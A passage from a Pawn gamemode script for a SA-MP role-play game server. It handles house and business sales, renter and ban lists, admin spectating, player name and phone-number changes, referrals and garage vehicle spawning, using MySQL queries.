    PINFO[i][pPhousekey] = 9999;
    SaveKonVal(i, "pPhousekey", 9999);
    if(PINFO[i][gParked] == 1)
    {
        CreateVehGarage(i);
        SCM(i,COLOR_Good,"Your first car have been evicted from the parking.");
    }
    if(PINFO[i][gParked_2] == 1)
    {
        CreateVehGarage_2(i);
        SCM(i,COLOR_Good,"Your first car have been evicted from the parking.");
    }
    //SaveAccount(i);
    }
    }
    }
    new
        query[ 512 ]
                    ;
    format( query, sizeof query, "UPDATE `users` SET pPhousekey='9999',gParked='0',gParked_2='0' WHERE pPhousekey='%d'", houseid);
    mysql_function_query(handle,query,false,"SendQuery","");
    return 1;
}

NeshoonBedeBans(playerid)
{
    new query[ 512 ];
    format(query,512,"SELECT * FROM `users` WHERE pBanned != '0' ORDER BY pBanTime DESC LIMIT 30");
    mysql_function_query(handle,query,true,"OnBansNeshoonMide","i",playerid);
    return 1;
}


NeshoonBedeRenters(playerid)
{
    new
        house = PINFO[playerid][pPhousekey],
        query[ 512 ];
    format(query,512,"SELECT * FROM `users` WHERE pPhousekey='%d' AND pName!='%s'",house,PINFO[playerid][pName]);
    mysql_function_query(handle,query,true,"OnRentersNeshoonMide","i",playerid);
    return 1;
}
forward OnRentersNeshoonMide(playerid);
public OnRentersNeshoonMide(playerid)
{
    SCM(playerid,CRISTIAN,"|__________<Renters>__________|");
    new
        string[512], rows = cache_get_row_count(handle);
        if(rows == 0) return SCM(playerid,COLOR_LIGHTRED,"** Nobody rent your house in server **");
        for(new i = 0;i<rows;i++)
        {
            new tarafname[40];
            cache_get_row(i,0,tarafname,handle,40);
            new tarafid = ReturnUserEx(tarafname);
            if(IsPlayerConnected(tarafid) && gPlayerLogged[tarafid] == 1)
            {
                format(string,512,"%s - {00FF00}Online",tarafname);
            }
            else
            {
                format(string,512,"%s - {57e547}Offline",tarafname);
            }
            SCM(playerid,COLOR_ALI,string);
        }
        if(rows == 1)
        {
            format(string,512,"There is 1 Renter of home.");
        }
        if(rows >= 2)
        {
            format(string,512,"There are %d Renters of home.",rows);
        }
        SCM(playerid,COLOR_ROUZ,string);
        return 1;
}

forward OnBansNeshoonMide(playerid);
public OnBansNeshoonMide(playerid)
{
	new strlol[2000],strlol2[256];
	new banned,banreason[128],bannedby[40],bandays;
    new rows = cache_get_row_count(handle);
        if(rows == 0) return SCM(playerid,COLOR_LIGHTRED,"There is no banned player.");
        for(new i = 0;i<rows;i++)
        {
            new tarafname[40];
            cache_get_row(i,0,tarafname,handle,40);
			cache_get_row(i,78,banreason,handle,128);
			cache_get_row(i,79,bannedby,handle,40);
			bandays = cache_get_row_int(i, 124, handle);

			if(banned == 2) {
			format(strlol2, 256,"%s, banned by: %s, reason: %s, permanently\n",tarafname,bannedby,banreason);
			}
			else if(banned == 1) {
			format(strlol2, 256,"%s, banned by %s , reason: %s, %d days\n",tarafname,bannedby,banreason,bandays);
			}
            strcat(strlol, strlol2, 2000);

        }
		ShowPlayerDialog(playerid, 21585, DIALOG_STYLE_MSGBOX, "[Banneds List]", strlol, "Cancel", "");
        return 1;
}


SellOfflinePlayerHouse(playerid,h)
{
                        new query[512],sendername[MAX_PLAYER_NAME];
                        format(query,512,"UPDATE `users` SET pPhousekey='9999',pAccount=pAccount+'%d',gParked='0',gParked_2='0' WHERE pName='%s'",HouseInfo[h][hForosh],HouseInfo[h][hOwner]);
                        mysql_function_query(handle,query,false,"SendQuery","");
                        PlayerInfo[playerid][pPhousekey] = h;
                        SaveKonVal(playerid, "pPhousekey", h);
                        PlayerInfo[playerid][pRented] = 0;
                        SaveKonVal(playerid, "pRented", 0);
                        HouseInfo[h][hOwned] = 1;
                        SaveKonValH(h, "hOwned", 1);
                        GetPlayerName(playerid, sendername, sizeof(sendername));
                        strmid(HouseInfo[h][hOwner], sendername, 0, strlen(sendername), 255);
                        SaveKonStrH(h, "hOwner", sendername);
                        GivePlayerPool(playerid,-HouseInfo[h][hForosh]);
                        PlayerPlayMusic(playerid);
                        SetPlayerInterior(playerid,HouseInfo[h][hInt]);
                        SetPlayerVirtualWorld(playerid,HouseInfo[h][hWorld]);
                        SetPlayerPosEx(playerid,HouseInfo[h][hEntrancex],HouseInfo[h][hEntrancey],HouseInfo[h][hEntrancez]);
                        SetPlayerMapIcon(playerid,30,HouseInfo[h][hExitx],HouseInfo[h][hExity],HouseInfo[h][hExitz],31,COLOR_LIGHTRED);
                        TooHouse[playerid] = h;
                        GameTextForPlayer(playerid, "~w~Welcome Home~n~You can exit at any time by moving to this door and Type /enter", 5000, 3);
                        SendClientMessage(playerid, COLOR_GRAD1, "Congratulations with home");
                        SendClientMessage(playerid, COLOR_GRAD2, "Type /househelp to view house commands.");
                        //SaveAccount(playerid);
                        Mahal[playerid] = 3;
                    TooBiz[playerid] = 9999;
return 1;
}
SellOfflinePlayerBiz(playerid,b)
{
    new query[512];
    format(query,512,"UPDATE `users` SET pPbiskey='9999',pAccount=pAccount+'%i' WHERE pName='%s'",BizzInfo[b][bForosh],BizzInfo[b][bOwner]);
    mysql_function_query(handle,query,false,"SendQuery","");
    PINFO[playerid][pPbiskey] = b;
    SaveKonVal(playerid, "pPbiskey", b);
    BizzInfo[b][bOwned] = 1;
    strmid(BizzInfo[b][bOwner],PINFO[playerid][pName],0,strlen(PINFO[playerid][pName]),40);
    GivePlayerPool(playerid,-BizzInfo[b][bForosh]);
    PlayerPlayMusic(playerid);
    SetPlayerInterior(playerid,BizzInfo[b][bInterior]);
    SetPlayerPosEx(playerid,BizzInfo[b][bExitX],BizzInfo[b][bExitY],BizzInfo[b][bExitZ]);
    TooBiz[playerid] = b;
    SetPlayerVirtualWorld(playerid,BizzInfo[b][bVW]);
    GameTextForPlayer(playerid, "~w~Welcome~n~You can exit at any time by moving to this door and Type /enter", 5000, 3);
    Mahal[playerid] = 15;
    TooHouse[playerid] = 9999;
    SendClientMessage(playerid, COLOR_WHITE, "Congratulations, On Your New Purchase.");
    SendClientMessage(playerid, COLOR_WHITE, "Type /help to review the new business help section.");
    OnBizUpdate(b);
    //SaveAccount(playerid);
    return 1;
}
SellOfflinePlayerSBiz(playerid,i)
{
    new query[512];
    format(query,512,"UPDATE `users` SET pPbiskey='9999',pAccount=pAccount+'%i' WHERE pName='%s'",SBizzInfo[i][sbForosh],SBizzInfo[i][sbOwner]);
    mysql_function_query(handle,query,false,"SendQuery","");
    GivePlayerPool(playerid,-SBizzInfo[i][sbForosh]);
    PlayerInfo[playerid][pPbiskey] = i+500;
    SaveKonVal(playerid, "pPbiskey", PINFO[playerid][pPbiskey]);
    SBizzInfo[i][sbOwned] = 1;
    strmid(SBizzInfo[i][sbOwner], PINFO[playerid][pName], 0, strlen(PINFO[playerid][pName]), 255);
    PlayerPlayMusic(playerid);
    SendClientMessage(playerid, COLOR_WHITE, "Congratulations, On Your New Purchase.");
    SendClientMessage(playerid, COLOR_WHITE, "Type /help to review the new business help section.");
    OnSbizUpdate(i);
    //SaveAccount(playerid);
    return 1;
}

PlayerIsAFKDetected(playerid)
{
    //if(PINFO[playerid][pAdmin] >= 7) return 0;
    //new string[512];
    //format(string,512,"",PINFO[playerid][pName],AFKTimeOnSV);
    //SendClientMessageToAll(COLOR_LIGHTRED,string);
//	SetTimerEx("KickPublic",500, 0, "i", playerid);
    return 1;
}

WantedAFKDetected(playerid)
{
    if(PINFO[playerid][pAdmin] >= 7) return 0;
    new string[512];
    format(string,512,"%s was kicked by AdmBot, reason: AFK Ba Wanted Bishtar Az 10 Daghighe",PINFO[playerid][pName]);
    SendClientMessageToAll(COLOR_LIGHTRED,string);
	SetTimerEx("KickPublic",500, 0, "i", playerid);
    return 1;
}

stock AdminWarn(string[])
{
    strins(string,AdminWarnMSG,0,512);
    ABroadCast(COLOR_AdminWarn,string,1);
    return 1;
}

stock ErrorMessage1(playerid)
{
    return SCM(playerid,COLOR_YouAreNotAdmin,YouAreNotAdminMSG);
}

stock PlayerNotConnected(playerid)
{
    return SCM(playerid,COLOR_PlayerNotConnected,PlayerNotConnectedMSG);
}

SpecPlayer(playerid,taraf)
{
    TogglePlayerSpectating(playerid,1);
    Specing[playerid] = 1;
    OnSpecPlayer[playerid] = taraf;
    return 1;
}
StopSpec(playerid)
{
    TogglePlayerSpectating(playerid,0);
    Specing[playerid] = 0;
    Specing2[playerid] = 0;
    TextDrawHideForPlayer(playerid,SpeedoTextDraw[OnSpecPlayer[playerid]]);
    TextDrawHideForPlayer(playerid,FuelTextDraw[OnSpecPlayer[playerid]]);
    TextDrawHideForPlayer(playerid,KiloTextDraw[OnSpecPlayer[playerid]]);
    TextDrawHideForPlayer(playerid,DoorsLockTextDraw[OnSpecPlayer[playerid]]);
    TextDrawHideForPlayer(playerid,DoorsLockTextDraw2[OnSpecPlayer[playerid]]);
    OnSpecPlayer[playerid] = 9999;
    OnStopSpecing[playerid] = true;
    return 1;
}

CheckSpecing(playerid)
{
    if(Specing[playerid] >= 1)
    {
    if(IsPlayerConnected(OnSpecPlayer[playerid]))
    {
    if(IsPlayerConnected(playerid))
    {
    SetPlayerVirtualWorld(playerid,GetPlayerVirtualWorld(OnSpecPlayer[playerid]));
    SetPlayerInterior(playerid,GetPlayerInterior(OnSpecPlayer[playerid]));
    if(IsPlayerInAnyVehicle(OnSpecPlayer[playerid]))
    {
    if(Specing2[playerid] != 2)
    {
    PlayerSpectateVehicle(playerid,GetPlayerVehicleID(OnSpecPlayer[playerid]));
    TextDrawShowForPlayer(playerid,SpeedoTextDraw[OnSpecPlayer[playerid]]);
    TextDrawShowForPlayer(playerid,FuelTextDraw[OnSpecPlayer[playerid]]);
    Specing[playerid] = 2;
    Specing2[playerid] = 2;
    if(OwnedMashin[GetPlayerVehicleID(OnSpecPlayer[playerid])] == 1 || OwnedMashin_2[GetPlayerVehicleID(OnSpecPlayer[playerid])] == 1)
    {
    TextDrawShowForPlayer(playerid,KiloTextDraw[OnSpecPlayer[playerid]]);
    TextDrawShowForPlayer(playerid,DoorsLockTextDraw[OnSpecPlayer[playerid]]);
    TextDrawShowForPlayer(playerid,DoorsLockTextDraw2[OnSpecPlayer[playerid]]);
    Specing[playerid] = 3;
    }
    }
    }
    else
    {
    if(Specing[playerid] == 1)
    {
    if(Specing2[playerid] != 1)
    {
    PlayerSpectatePlayer(playerid,OnSpecPlayer[playerid]);
    Specing[playerid] = 1;
    Specing2[playerid] = 1;
    }
    }
    if(Specing[playerid] == 2)
    {
    if(Specing2[playerid] != 1)
    {
    TextDrawHideForPlayer(playerid,SpeedoTextDraw[OnSpecPlayer[playerid]]);
    TextDrawHideForPlayer(playerid,FuelTextDraw[OnSpecPlayer[playerid]]);
    PlayerSpectatePlayer(playerid,OnSpecPlayer[playerid]);
    Specing[playerid] = 1;
    Specing2[playerid] = 1;
    }
    }
    if(Specing[playerid] == 3)
    {
    if(Specing2[playerid] != 1)
    {
    TextDrawHideForPlayer(playerid,KiloTextDraw[OnSpecPlayer[playerid]]);
    TextDrawHideForPlayer(playerid,DoorsLockTextDraw[OnSpecPlayer[playerid]]);
    TextDrawHideForPlayer(playerid,DoorsLockTextDraw2[OnSpecPlayer[playerid]]);
    PlayerSpectatePlayer(playerid,OnSpecPlayer[playerid]);
    Specing[playerid] = 1;
    Specing2[playerid] = 1;
    }
    }
    }
    }
    }
    else
    {
    SCM(playerid,COLOR_Good,"Player left the game.");
    StopSpec(playerid);
    }
    }
    return 1;
}

SetSpawnKol(playerid)
{
    if(PINFO[playerid][pAdmin] > 0 || PINFO[playerid][pHelper] > 0) return SetSpawnInfo(playerid,gTeam[playerid],217,1642.339965,2240.929931,13.785160,0,0,0,0,0,0,0);
    if(IsInFaction(playerid)) return SetSpawnInfo(playerid,gTeam[playerid],PINFO[playerid][fSkin],1642.339965,2240.929931,13.785160,0,0,0,0,0,0,0);
    else return SetSpawnInfo(playerid,gTeam[playerid],PINFO[playerid][cSkin],1642.339965,2240.929931,13.785160,0,0,0,0,0,0,0);
}

ReturnEventID()
{
 new ReturnInT = 9999;
    for(new i;i<1000;i++)
    {
        if(EventIDUsed[i] == false)
        {
            ReturnInT = i;
            break;
        }
    }
    return ReturnInT;
}
ReturnAgentID()
{
    new ReturnInT = INVALID_PLAYER_ID;
    for(new i;i<MAX_PLAYERS;i++)
    {
        if(AgentContractIDUsed[i] == false)
        {
            ReturnInT = i;
            break;
        }
    }
    return ReturnInT;
}
ReturnContractID()
{
    new ReturnInT = INVALID_PLAYER_ID;
    for(new i;i<MAX_PLAYERS;i++)
    {
        if(ContractIDUsed[i] == false)
        {
            ReturnInT = i;
            break;
        }
    }
    return ReturnInT;
}
EventAdminSay(color,const str[])
{
    for(new i = 0;i<LastPID;i++)
    {
        if(IsPlayerConnected(i) && gPlayerLogged[i] == 1)
        {
            if(PINFO[i][pAdmin] >= 1)
            {
                if(TogEvent[i] == false)
                {
                    SCM(i,color,str);
                }
            }
        }
    }
    return 1;
}
EventSay(color,const str[])
{
    for(new i = 0;i<LastPID;i++)
    {
        if(IsPlayerConnected(i) && gPlayerLogged[i] == 1)
        {
            if(TogEvent[i] == false)
            {
                SCM(i,color,str);
            }
        }
    }
    return 1;
}
/*RandomString(Dest[],length)// credits to eblis( Eblis )
{
    new string[256];
    new charac[256];
    for(new i;i<length;i++)
    {
        switch(random(62))
        {
            case 0:charac[0] = 'a';
            case 1:charac[0] = 'b';
            case 2:charac[0] = 'c';
            case 3:charac[0] = 'd';
            case 4:charac[0] = 'e';
            case 5:charac[0] = 'f';
            case 6:charac[0] = 'g';
            case 7:charac[0] = 'h';
            case 8:charac[0] = 'i';
            case 9:charac[0] = 'j';
            case 10:charac[0] = 'k';
            case 11:charac[0] = 'l';
            case 12:charac[0] = 'm';
            case 13:charac[0] = 'n';
            case 14:charac[0] = 'o';
            case 15:charac[0] = 'p';
            case 16:charac[0] = 'q';
            case 17:charac[0] = 'r';
            case 18:charac[0] = 's';
            case 19:charac[0] = 't';
            case 20:charac[0] = 'u';
            case 21:charac[0] = 'v';
            case 22:charac[0] = 'w';
            case 23:charac[0] = 'x';
            case 24:charac[0] = 'y';
            case 25:charac[0] = 'z';
            case 26:charac[0] = 'A';
            case 27:charac[0] = 'B';
            case 28:charac[0] = 'C';
            case 29:charac[0] = 'D';
            case 30:charac[0] = 'E';
            case 31:charac[0] = 'F';
            case 32:charac[0] = 'G';
            case 33:charac[0] = 'H';
            case 34:charac[0] = 'I';
            case 35:charac[0] = 'J';
            case 36:charac[0] = 'K';
            case 37:charac[0] = 'L';
            case 38:charac[0] = 'M';
            case 39:charac[0] = 'N';
            case 40:charac[0] = 'O';
            case 41:charac[0] = 'P';
            case 42:charac[0] = 'Q';
            case 43:charac[0] = 'R';
            case 44:charac[0] = 'S';
            case 45:charac[0] = 'T';
            case 46:charac[0] = 'U';
            case 47:charac[0] = 'V';
            case 48:charac[0] = 'W';
            case 49:charac[0] = 'X';
            case 50:charac[0] = 'Y';
            case 51:charac[0] = 'Z';
            case 52:charac[0] = '0';
            case 53:charac[0] = '1';
            case 54:charac[0] = '2';
            case 55:charac[0] = '3';
            case 56:charac[0] = '4';
            case 57:charac[0] = '5';
            case 58:charac[0] = '6';
            case 59:charac[0] = '7';
            case 60:charac[0] = '8';
            case 61:charac[0] = '9';
            default:charac[0] = '0';
        }
        strcat(string,charac[0],length);
    }
        for(new i;i<length;i++) Dest[i] = string[i];
}*/
StopPaintBalling()
{
    PaintballStarted = 0;
    PaintBallStarting = 0;
    PaintBallPlayers = 0;
    for(new i;i<LastPID;i++)
    {
        if(IsPlayerConnected(i))
        {
            if(OnPaintBall[i] != 0)
            {
                SetPlayerPosEx(i,SBizzInfo[10][sbEntranceX],SBizzInfo[10][sbEntranceY],SBizzInfo[10][sbEntranceZ]);
                SetPlayerVirtualWorld(i,0);
                OnPaintBall[i] = 0;
                Mahal[i] = 9999;
                TooHouse[i] = 9999;
                TooBiz[i] = 9999;
                PaintBallKills[i] = 0;
                ResetPlayerTofang(i);
                SetPlayerKhoon(true, i,100);
                TogglePlayerControllable(i, 1);
				pbdg = 0;
				pbsl = 0;
				pbsg = 0;
				pbss = 0;
				pbcs = 0;
				pbmp = 0;
				pbsr = 0;
				pbak = 0;
				pbm4 = 0;
				pbcr = 0;
                if(PaintBallLeadKills != 0)
                {
                    new lolii[256];
                    format(lolii, 256, "Paintball has finished, Winner: %s(%i) with %i kills.", PINFO[PaintBallWinner][pName], PaintBallWinner, PaintBallLeadKills);
                    SCM(i, COLOR_WHITE, lolii);
					ResetPlayerTofang(i);
                }
            }
        }
    }
    PaintBallWinner = INVALID_PLAYER_ID;
    PaintBallLeadKills = 0;
}
Public:OnPlayerChangeName(playerid,taraf,oldName[],tmp[])
{
    if(cache_get_row_count(handle) != 0) {gPlayerLogged[taraf] = 1; return SCM(playerid,COLOR_ALI,"That name is already exist.");}
    new query[300];
    format(query,sizeof query,"UPDATE `users` SET pName='%s' WHERE pID='%d'",tmp,PINFO[taraf][pID]);
    mysql_function_query(handle,query,false,"OnPlayerChangeName2","iiss",playerid,taraf,PINFO[taraf][pName],tmp);
    return 1;
}

Public:OnPlayerChangeNameShop(playerid,taraf,oldName[],tmp[])
{
    if(cache_get_row_count(handle) != 0) {gPlayerLogged[taraf] = 1; return SCM(playerid,COLOR_ALI,"That name is already exist.");}
    new query[300];
    format(query,sizeof query,"UPDATE `users` SET pName='%s' WHERE pID='%d'",tmp,PINFO[taraf][pID]);
    mysql_function_query(handle,query,false,"OnPlayerChangeNameShop2","iiss",playerid,taraf,PINFO[taraf][pName],tmp);

				PINFO[playerid][pGold] -= 300;
	        	SaveKonVal(playerid, "pGold", PINFO[playerid][pGold]);
	SCM(playerid, COLOR_YELLOW, "[Shop]: your nickname succeefully changed.");

    return 1;
}


Public:OnPlayerChangeNameTT(playerid,taraf,oldName[],tmp[])
{
    if(cache_get_row_count(handle) != 0) {gPlayerLogged[taraf] = 1; return SCM(playerid,COLOR_ALI,"That name is already exist.");}
    new query[300];
    format(query,sizeof query,"UPDATE `users` SET pName='%s' WHERE pID='%d'",tmp,PINFO[taraf][pID]);
    mysql_function_query(handle,query,false,"OnPlayerChangeName2","iis[TT]s",playerid,taraf,PINFO[taraf][pName],tmp);
    return 1;
}
Public:OnPlayerChangeNameGG(playerid,taraf,oldName[],tmp[])
{
    if(cache_get_row_count(handle) != 0) {gPlayerLogged[taraf] = 1; return SCM(playerid,COLOR_ALI,"That name is already exist.");}
    new query[300];
    format(query,sizeof query,"UPDATE `users` SET pName='%s' WHERE pID='%d'",tmp,PINFO[taraf][pID]);
    mysql_function_query(handle,query,false,"OnPlayerChangeName2","ii[GG]ss",playerid,taraf,PINFO[taraf][pName],tmp);
    return 1;
}
Public:OnPlayerChangeName2(playerid,taraf,oldName[],tmp[])
{
    SetPlayerName(taraf,tmp);
    strmid(PINFO[taraf][pName],tmp,0,strlen(tmp),40);
    new ssttrr[256];
    format(ssttrr,256,"You changed %s name to %s seccussfully.",oldName,tmp);
    SCM(playerid,COLOR_GG,ssttrr);
    format(ssttrr,256,"Admin %s changed your name(%s) to %s",PINFO[playerid][pName],oldName,tmp);
    SCM(taraf,COLOR_GG,ssttrr);
    format(ssttrr,256,"Admin %s changed %s(%d) name to %s",PINFO[playerid][pName],oldName,taraf,tmp);
    AdminWarn(ssttrr);
    gPlayerLogged[taraf] = 1;
    RequestSelected[taraf] = false;
    new biz = PINFO[taraf][pPbiskey];
    new hh = PINFO[taraf][pPhousekey];
    if(biz != 9999)
    {
        if(biz >= 500)
        {
            if(!strcmp(PINFO[taraf][pName], SBizzInfo[biz-500][sbOwner], true))
            {
                strmid(SBizzInfo[biz-500][sbOwner],tmp,0,strlen(tmp),40);
                OnSbizUpdate(biz-500);
            }
        }
        else
        {
            if(!strcmp(PINFO[taraf][pName], BizzInfo[biz][bOwner], true))
            {
                strmid(BizzInfo[biz][bOwner],tmp,0,strlen(tmp),40);
                OnBizUpdate(biz);
            }
        }
    }
    if(hh != 9999)
    {
        if(!strcmp(PINFO[taraf][pName], HouseInfo[hh][hOwner], true))
        {
            strmid(HouseInfo[hh][hOwner],tmp,0,strlen(tmp),40);
            SaveKonStrH(hh, "hOwner", tmp);
        }
    }
}


Public:OnPlayerChangeNameShop2(playerid,taraf,oldName[],tmp[])
{

    new ssttrr[256];
    format(ssttrr,256,"[Shop]: your name(%s) succeefully changed to %s.",oldName,tmp);
    SCM(taraf,COLOR_YELLOW,ssttrr);
    gPlayerLogged[taraf] = 1;


    RequestSelected[taraf] = false;
    new biz = PINFO[taraf][pPbiskey];
    new hh = PINFO[taraf][pPhousekey];
    if(biz != 9999)
    {
        if(biz >= 500)
        {
            if(!strcmp(PINFO[taraf][pName], SBizzInfo[biz-500][sbOwner], true))
            {
                strmid(SBizzInfo[biz-500][sbOwner],tmp,0,strlen(tmp),40);
                OnSbizUpdate(biz-500);
            }
        }
        else
        {
            if(!strcmp(PINFO[taraf][pName], BizzInfo[biz][bOwner], true))
            {
                strmid(BizzInfo[biz][bOwner],tmp,0,strlen(tmp),40);
                OnBizUpdate(biz);
            }
        }
    }
    if(hh != 9999)
    {
        if(!strcmp(PINFO[taraf][pName], HouseInfo[hh][hOwner], true))
        {
            strmid(HouseInfo[hh][hOwner],tmp,0,strlen(tmp),40);
            SaveKonStrH(hh, "hOwner", tmp);
        }
    }
	SetPlayerName(taraf,tmp);
    strmid(PINFO[taraf][pName],tmp,0,strlen(tmp),40);


	}



SetPlayerNumber(playerid,ChangerID,newnumber)
{
    new query[256];
    format(query,256,"SELECT * FROM `users` WHERE pPnumber='%d'",newnumber);
    mysql_function_query(handle,query,true,"OnUsersLoad","iii",playerid,ChangerID,newnumber);
    return 1;
}
Public:OnUsersLoad(playerid,ChangerID,newnumber)
{
    if((newnumber < 1000000 || newnumber > 9999999) && ChangerID != INVALID_PLAYER_ID) return SCM(ChangerID,COLOR_ALI,"Invalid Phone Number.");
    if(cache_get_row_count(handle) <= 0)
    {
        PINFO[playerid][pPnumber] = newnumber;
        SaveKonVal(playerid, "pPnumber", newnumber);
        if(ChangerID != INVALID_PLAYER_ID)
        {
            new string[256];
            format(string, sizeof(string), "The Player Phone Number Was Set To %s", FormatPhoneNumber(newnumber));
            SCM(ChangerID,COLOR_ALI,string);
        }
    }
    else
    {
        if(ChangerID == INVALID_PLAYER_ID)
        {
            new rand = RandomShomare(1000000,9999999);
            SetPlayerNumber(playerid,INVALID_PLAYER_ID,rand);
        }
        else
        {
            new esm[40];
            cache_get_row(0,0,esm,handle,40);
            new string[256];
            format(string,256,"A player with name: %s already using this number.",esm);
            SCM(playerid,COLOR_ALI,string);
        }
    }
    return 1;
}

SearchForReferral(playerid, id, lang)
{
    if(!IsPlayerConnected(playerid)) return 0;
    if(id == PINFO[playerid][pID])
    {
        if(lang == 1) ShowPlayerDialog(playerid,986,DIALOG_STYLE_INPUT,"Etelaat moarefi","Referral id vared shode vojod nadarad.\n\nLotfan referral id an shakhs ra dar zir benevisid.","OK","Bargasht");
        if(lang == 2) ShowPlayerDialog(playerid, 988, DIALOG_STYLE_INPUT, "Referral ID infromation", "Invalid referral id\n\nPlease enter the referral id below", "OK", "Back");
        return 1;
    }
    if(id > 0)
    {
        new query[300];
        format(query, 300, "SELECT * FROM `users` WHERE pID='%d'", id);
        mysql_function_query(handle, query, true, "OnReferralSearched", "ii", playerid, lang);
        ReferralID[playerid] = id;
        return 1;
    }
    if(lang == 1) ShowPlayerDialog(playerid,986,DIALOG_STYLE_INPUT,"Etelaat moarefi","Referral id vared shode vojod nadarad.\n\nLotfan referral id an shakhs ra dar zir benevisid.","OK","Bargasht");
    if(lang == 2) ShowPlayerDialog(playerid, 988, DIALOG_STYLE_INPUT, "Referral ID infromation", "Invalid referral id\n\nPlease enter the referral id below", "OK", "Back");
    return 0;
}

Public:OnReferralSearched(playerid, lang)
{
    new row = cache_get_row_count(handle);
    if(row == 0)
    {
        if(lang == 1) return ShowPlayerDialog(playerid,986,DIALOG_STYLE_INPUT,"Etelaat moarefi","Referral id vared shode vojod nadarad.\n\nLotfan referral id an shakhs ra dar zir benevisid.","OK","Bargasht");
        if(lang == 2) return ShowPlayerDialog(playerid, 988, DIALOG_STYLE_INPUT, "Referral ID infromation", "Invalid referral id\n\nPlease enter the referral id below", "OK", "Back");
    }
    new esmt[40],string[200];
    cache_get_row(0, 0, esmt, handle, 40);
    if(lang == 1) format(string, 200, "Aya Motmaen Hastid Ke %s In Server Ra Be Shoma Moarefi Karde Ast?",esmt);
    if(lang == 2) format(string, 200, "Are you sure %s brought you to this server?",esmt);
    if(lang == 1) ShowPlayerDialog(playerid, 980, DIALOG_STYLE_MSGBOX, "Referral infromation", string, "Bale", "Kheir");
    if(lang == 2) ShowPlayerDialog(playerid, 980, DIALOG_STYLE_MSGBOX, "Referral infromation", string, "Yes", "No");
    return 1;
}
Public:IsPlayerInWater(playerid)
{
    new animationIndex = GetPlayerAnimationIndex(playerid);
    return (animationIndex >= 1538 && animationIndex <= 1544 && animationIndex != 1542);
}

Public:IsPlayerSpawned(playerid)
{
    new playerState = GetPlayerState(playerid);
    return ((playerState >= 1 && playerState <= 6) || playerState == 8);
}

Public:IsPlayerInVehicleFireMode(playerid)
{
    return (GetPlayerCameraMode(playerid) == 55);
}

CreateVehGarage(playerid)
{
                new model = PlayerInfo[playerid][cModel];
                new Float:posx = PlayerInfo[playerid][cLocationx];
                new Float:posy = PlayerInfo[playerid][cLocationy];
                new Float:posz = PlayerInfo[playerid][cLocationz];
                new Float:angle = PlayerInfo[playerid][cAngle];
                new color1 = PlayerInfo[playerid][cColor1];
                new color2 = PlayerInfo[playerid][cColor2];
                new carid = CreateVehicle(model,posx,posy,posz,angle,color1,color2,-1);
                if(PlayerInfo[playerid][cHealth] <= 249.9)
                {
                    PlayerInfo[playerid][cHealth] = 1000.0;
                    SaveKonFloat(playerid, "cHealth", 1000);
                    if(PINFO[playerid][cInsurance] <= 0)
                    {
                        PINFO[playerid][cFixed] = 0;
                        SaveKonVal(playerid, "cFixed", 0);
                    }
                    else
                    {
                        PINFO[playerid][cInsurance] --;
                        SaveKonVal(playerid, "cInsurance", PINFO[playerid][cInsurance]);
                    }
                }
                OwnedMashin[carid] = 1;
                MashinOwner[carid] = playerid;
                SetVehicleNumberPlate(carid,PlayerInfo[playerid][cPlate]);
                PlayerInfo[playerid][pCar] = carid;
                SaveKonVal(playerid, "pCar", carid);
                Benzin[carid] = PlayerInfo[playerid][cFuel];
                SetVehicleHealthEx(carid,PlayerInfo[playerid][cHealth]);
                ModVehicle(playerid,carid);
                UpdateVehicleDamageStatus(carid,PINFO[playerid][cPanel],PINFO[playerid][cDoors],PINFO[playerid][cLights],PINFO[playerid][cTires]);
                PlayerInfo[playerid][cLock] = 1;
                SaveKonVal(playerid, "cLock", 1);
                for(new i = 0; i < LastPID; i++ )
                {
                    if(IsPlayerConnected(i)) SetVehicleParamsForPlayer(carid,i,0,PINFO[playerid][cLock]);
                }
                SetVehiclePos(carid, PINFO[playerid][gLocationX], PINFO[playerid][gLocationY], PINFO[playerid][gLocationZ]);
                SetVehicleZAngle(carid, PINFO[playerid][gAngle]);
                PINFO[playerid][gParked] = 0;
                SaveKonVal(playerid, "gParked", 0);
                return 1;
}
CreateVehGarage_2(playerid)
{
                new model = PlayerInfo[playerid][cModel_2];
                new Float:posx = PlayerInfo[playerid][cLocationx_2];
                new Float:posy = PlayerInfo[playerid][cLocationy_2];
                new Float:posz = PlayerInfo[playerid][cLocationz_2];
                new Float:angle = PlayerInfo[playerid][cAngle_2];
                new color1 = PlayerInfo[playerid][cColor1_2];
                new color2 = PlayerInfo[playerid][cColor2_2];
                new carid = CreateVehicle(model,posx,posy,posz,angle,color1,color2,-1);
                if(PlayerInfo[playerid][cHealth_2] <= 249.9)
                {
                    PlayerInfo[playerid][cHealth_2] = 1000.0;
                    SaveKonFloat(playerid, "cHealth_2", 1000);
                    if(PINFO[playerid][cInsurance_2] <= 0)
                    {
                        PINFO[playerid][cFixed_2] = 0;
                        SaveKonVal(playerid, "cFixed_2", 0);
                    }
                    else
                    {
                        PINFO[playerid][cInsurance_2] --;
                        SaveKonVal(playerid, "cInsurance_2", PINFO[playerid][cInsurance_2]);
                    }
                }
                OwnedMashin_2[carid] = 1;
                MashinOwner_2[carid] = playerid;
                SetVehicleNumberPlate(carid,PlayerInfo[playerid][cPlate_2]);
                PlayerInfo[playerid][pCar_2] = carid;
                SaveKonVal(playerid, "pCar_2", carid);
                Benzin[carid] = PlayerInfo[playerid][cFuel_2];
                SetVehicleHealthEx(carid,PlayerInfo[playerid][cHealth_2]);
                ModVehicle(playerid,carid);
                UpdateVehicleDamageStatus(carid,PINFO[playerid][cPanel_2],PINFO[playerid][cDoors_2],PINFO[playerid][cLights_2],PINFO[playerid][cTires_2]);
                PlayerInfo[playerid][cLock_2] = 1;
                SaveKonVal(playerid, "cLock_2", 1);
                for(new i = 0; i < LastPID; i++ )
                {
                    if(IsPlayerConnected(i)) SetVehicleParamsForPlayer(carid,i,0,PINFO[playerid][cLock_2]);
                }
                SetVehiclePos(carid, PINFO[playerid][gLocationX_2], PINFO[playerid][gLocationY_2], PINFO[playerid][gLocationZ_2]+0.5);
                SetVehicleZAngle(carid, PINFO[playerid][gAngle_2]);
                PINFO[playerid][gParked_2] = 0;
                SaveKonVal(playerid, "gParked_2", 0);
                return 1;
}
Public:KamKonTune(playerid)
{
    for(new i = 16;i<21;i++)
    {
        if(IsPlayerInRangeOfPoint(playerid, 65, SBizzInfo[i][sbEntranceX], SBizzInfo[i][sbEntranceY], SBizzInfo[i][sbEntranceZ]))
        {
            new string[256];
            format(string, 256, "~r~-$%d", SBizzInfo[i][sbEntranceCost]);
            GameTextForPlayer(playerid, string, 5000, 1);
